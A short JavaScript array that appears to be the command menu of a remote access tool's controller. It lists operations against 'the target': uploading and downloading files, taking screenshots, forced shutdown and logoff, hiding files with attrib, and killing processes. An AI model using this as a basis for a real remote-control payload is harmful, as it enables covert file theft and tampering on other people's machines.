const dataCommands = [
    ["cmd", "systeminfo", "cmd terminal application."],
    ["powershell", "dir", "powershell terminal application."],
    ["upload", "url@filenmae", "upload files to the target."],
    ["download", "filenmae", "download files from the target."],

    ["-", "screenshot", "screenshot image."],
    ["-", "exit", "it will exit the payload."],

    ["cmd", "shutdown /s /f /t 0", "shutdown the computer."],
    ["cmd", "shutdown /r /f /t 0", "restart the computer."],
    ["cmd", "shutdown /s /f /t 300", "shutdown with delay."],
    ["cmd", "shutdown /l", "logoff the current user."],
    ["cmd", "attrib +h +s +r filename", "hide file or folder."],
    ["cmd", "attrib -h -s -r filename", "unhide file or folder."],
    ["cmd", "taskkill /IM processName /F", "end task the program."],
]